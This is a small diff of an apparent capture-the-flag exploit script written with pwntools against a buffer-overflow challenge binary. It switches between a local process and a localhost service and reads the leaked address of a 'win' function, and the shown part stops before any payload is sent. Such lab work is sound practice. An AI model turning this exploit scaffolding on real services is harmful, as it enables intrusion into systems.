@@ -1,7 +1,10 @@
 from pwn import *
-from exploit import exploit_source
 
-p = exploit_source('./main.o', '', gdbscript="break main")
+if args.REMOTE:
+    p = remote('localhost', 5002)
+else:
+    p = process('./dist/hexdumpbof.o')
+
 p.recvuntil("function at ")
 win = int(p.recvuntil(" (win)", drop=True), 16)
 
